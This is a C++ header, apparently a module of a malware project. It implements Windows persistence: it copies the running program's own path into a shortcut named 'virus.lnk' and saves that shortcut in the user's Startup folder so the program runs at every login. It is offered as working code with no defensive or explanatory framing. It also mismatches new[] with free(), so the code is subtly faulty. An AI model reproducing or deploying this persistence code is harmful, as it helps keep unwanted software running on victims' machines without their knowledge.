#pragma once
#include<string>
#include<Windows.h>
#include<shellapi.h>
#include <shlobj.h>
#include <objbase.h>


#include "abstract_auto_run.h"
class AutoRunAddDirectory : public AbstractAutoRun{
private:
    std::string lnk_name_ = "virus.lnk";

private:
	std::string GetProgrammPath() 
	{
		char* buf = new char[1024];
		GetModuleFileNameA(nullptr, buf, MAX_PATH);
		std::string str(buf);
		free(buf);
		return str;	
	}
public:
	bool AutoRun() 
    {
        std::string program_path = GetProgrammPath();  

        
        char startup_path[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) != S_OK)
        {
            return false;
        }

        
        std::string shortcut_path = std::string(startup_path) + "\\" + lnk_name_;

        CoInitialize(NULL);
        IShellLinkA* shell_link;

        if (CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&shell_link) != S_OK)
        {
            CoUninitialize();
            return false;
        }
        shell_link->SetPath(program_path.c_str());

        IPersistFile* persistFile;

        if (shell_link->QueryInterface(IID_IPersistFile, (void**)&persistFile) != S_OK)
        {
            shell_link->Release();
            CoUninitialize();
            return false;
        }

        std::wstring shortcut_path_second(shortcut_path.begin(), shortcut_path.end());
        if (persistFile->Save(shortcut_path_second.c_str(), TRUE) != S_OK)
        {
            persistFile->Release();
            shell_link->Release();
            CoUninitialize();
            return false;
        }
        persistFile->Release();
        shell_link->Release();
        CoUninitialize();

        return true;
	}
};